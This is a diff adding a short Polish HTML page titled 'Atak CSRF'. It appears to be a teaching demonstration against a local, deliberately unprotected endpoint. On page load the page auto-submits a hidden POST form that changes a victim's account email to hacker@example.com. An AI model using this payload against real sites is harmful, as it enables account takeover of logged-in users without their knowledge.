@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="pl">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Atak CSRF</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form
+      action="http://localhost:8000/api/change-email-non-protected/"
+      method="POST"
+    >
+      <input type="hidden" name="email" value="hacker@example.com" />
+    </form>
+  </body>
+</html>
